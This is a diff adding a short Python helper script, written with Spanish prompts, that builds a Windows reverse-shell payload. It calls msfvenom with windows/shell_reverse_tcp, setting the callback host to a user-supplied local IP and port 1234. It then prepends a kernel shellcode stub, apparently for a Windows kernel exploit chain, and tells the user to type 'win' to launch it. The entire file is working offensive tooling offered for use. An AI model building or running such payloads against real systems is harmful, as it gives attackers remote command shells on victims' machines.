@@ -1,0 +1,19 @@
+#!/usr/bin/env python3
+
+import os
+import time
+from colorama import Fore, Style
+
+print()
+IP_local = input(Fore.CYAN + "Ip local: " + Style.RESET_ALL)
+print(Fore.CYAN + "Puerto local: " + Style.RESET_ALL + "1234")
+time.sleep(0.5)
+print()
+print(Fore.YELLOW + " [i] Creando payload...")
+
+msfvenom = f"msfvenom -p windows/shell_reverse_tcp -f raw -o PAYLOAD.bin EXITFUNC=thread LHOST={IP_local} LPORT=1234 2>/dev/null"
+exportación = "/usr/bin/cat sc_x86_kernel.bin PAYLOAD.bin > PAYLOADWIN.bin"
+os.system(msfvenom)
+time.sleep(1)
+os.system(exportación)
+print(Fore.GREEN + " [+] Payload creado! Escribe " + Fore.MAGENTA + Style.BRIGHT + "win " + Style.RESET_ALL + Fore.GREEN + "para ejecutar el comando")
